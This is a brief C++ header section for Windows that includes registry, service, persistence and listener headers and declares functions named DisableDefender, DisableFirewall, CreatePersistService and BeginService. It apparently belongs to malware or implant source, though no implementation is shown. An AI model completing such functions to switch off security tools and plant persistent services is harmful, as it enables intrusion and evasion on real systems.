#ifndef UNICODE
#define UNICODE
#endif 

#include <Windows.h>
#include <map>
#include <iostream>
#include <winreg.h>
#include <winsvc.h>
#include <filesystem>
#include "..\include\logger.hpp"
#include "..\include\header.hpp"
#include "..\include\util.hpp"
#include "..\persistence\embed.hpp"
#include "..\listener\embed.hpp"

void DisableDefender();
void DisableFirewall();
int CreatePersistService();
int BeginService();